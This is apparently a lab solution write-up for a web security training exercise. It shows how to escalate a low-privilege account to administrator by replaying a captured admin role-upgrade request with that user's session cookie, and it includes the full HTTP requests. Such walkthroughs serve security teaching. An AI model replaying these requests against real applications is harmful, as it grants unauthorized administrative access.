@@ -1,0 +1,87 @@
+// Lab: Multi-step process with no access control on one step.
+
+
+This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
+
+
+
+
+// Solution:
+
+
+Step 1 — Login as Admin & Capture the Request.
+
+
+
+1. Login at /login using administrator:admin.
+
+2. Go to /admin panel.
+
+3. Turn ON Burp Intercept before clicking promote.
+
+4. Promote carlos → click confirm.
+
+
+In Burp, you'll see this request — send it to Repeater:
+
+POST /admin-roles
+Cookie: session=<ADMIN_SESSION>
+
+action=upgrade&confirmed=true&username=carlos
+
+
+
+
+
+Step 2 — Get Wiener's Session Cookie
+
+
+1. Open incognito window
+
+2. Login as wiener:peter
+
+3. Intercept the request to login as wiener:peter in Burp.
+
+4. Copy the session cookie value
+
+
+
+
+Step 3 — Modify Request in Burp Repeater
+
+
+Make exactly 2 changes only:
+
+Field                     Before                    After
+
+Cookie: session=        admin's session       wiener's session
+
+username=               carlos                wiener
+
+
+
+Final request:
+
+
+POST /admin-roles HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=<WIENER_SESSION>
+Content-Type: application/x-www-form-urlencoded
+
+action=upgrade&confirmed=true&username=wiener
+
+
+
+
+Step 4 — Send & Verify 
+
+
+1. Click Send in Repeater
+
+2. Response should be 302 Found
+
+3. Go back to browser → login as wiener:peter
+
+4. You now have admin access — lab solved!
